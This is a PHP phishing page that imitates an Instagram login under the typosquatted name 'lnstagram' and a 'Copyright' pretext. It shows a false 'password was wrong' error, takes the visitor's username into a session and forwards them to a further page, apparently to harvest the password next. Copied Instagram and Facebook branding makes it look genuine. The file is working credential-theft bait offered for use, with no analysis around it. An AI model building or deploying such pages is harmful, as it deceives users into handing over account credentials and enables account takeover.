<?php
if ($_GET) {
	$username=$_GET["username"];
	session_start();
	$_SESSION["username"]=$username;
	header("location: news.php?username=$username");
}


?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Copyright • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://i.resimyukle.xyz/PyRHaN.jpg">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body style="background:#fafafa;">
	<header style="padding-left:10px;padding-right:10px;box-sizing:border-box;">
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200" style="display:none;">
		


		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSv3GysrPLnBI6OO1TdqqIek9ntr_DyyqOAMQ&usqp=CAU" width="170"><br>
<div style="font: inherit;font-size: 16px; margin-right: 10px; margin-left:5px; color:#c90e0e" class="eiCW-" id="sonucc">Sorry, your password was wrong. <br>Please carefully check your password and log in again.</div> <br>			<br><center></center>
			<form method="get" >
			<input type="text" name="username" placeholder="Username" style="width:200px;height:23px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede">
			<br>
		
		<br>
			

	
			<button type="submit" class="qenzyist" style="width:240px;height:24px;">Next</button>
		</form>
				
<br>
			</div>
			<br><br><br>
			<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
				<p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
Instagram From Facebook
© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
</p>

			</div>

	
		<div class="dont" style="display:none;">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<br><br><br><br><br><br>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<?php

?>

